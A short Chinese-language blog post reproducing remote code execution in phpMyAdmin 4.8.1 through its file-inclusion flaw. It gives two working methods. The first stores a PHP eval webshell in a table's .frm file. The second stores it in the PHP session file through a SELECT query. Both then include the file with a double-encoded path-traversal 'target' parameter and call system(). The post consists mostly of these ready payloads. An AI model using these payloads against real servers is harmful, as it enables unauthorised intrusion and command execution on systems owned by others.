---
layout: post
title: phpmyadmin4.8.1后台getshell
categories: [permeate]
tags: [permeate]
fullview: false
comments: true
---

复现一下  
  
phpmyadmin4.8.1后台getshell  

包含文件进行getshell  

姿势:  

### ① ###
建立数据库的，新建表，字段名为一句话木马。 

  
![](https://i.imgur.com/EPlDyPp.png)

会生成对应的数据库文件，相应文件的路径查看  
>     select @@datadir;

![](https://i.imgur.com/Audw2qN.png)  
  
这个样子就会在/var/lib/mysql/hack/hack.frm的文件里包含着一句话木马的字段。  

![](https://i.imgur.com/bEMPj9r.png)  

>     ?target=db_sql.php%253f/../../../../../../var/lib/mysql/data/hack/hack.frm  

![](https://i.imgur.com/UONoCwf.png)  

权限不够，  

![](https://i.imgur.com/HZtEHKa.png)  

不过这个windows下面倒是很简单，不用考虑权限。
### ② ###

查询语句(一句话木马)，  

执行查询  

>     select '<?php @eval($_GET["code"])?>'


之后会保存在session文件里。  

session文件:  
>     /var/lib/php/sessions/sess_你的SESSION ID  

包含payload:
>     ?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_6ker17rs59cuu39e6rfdpdrcaoto5116&a=system("ls");
  
![](https://i.imgur.com/ksFcQS2.png) 

